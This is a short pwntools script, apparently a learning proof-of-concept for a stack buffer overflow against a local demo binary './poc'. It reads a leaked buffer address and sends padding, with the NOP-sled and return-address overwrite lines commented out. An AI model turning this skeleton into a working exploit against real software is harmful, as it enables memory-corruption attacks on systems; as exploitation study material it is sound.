## python3 rts_poc.py

from pwn import *


p = process('./poc')
p.recvuntil('buf[50] address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
 
exploit = b"aaaaaaaaaaaaaaabbbbbbbbbbbbbbbb"

#exploit += b"\x90" * (72 - len(exploit))
#exploit += p64(stackAddr)

pause()
#gdb.attach(p)

p.send(exploit)

#p.interactive()
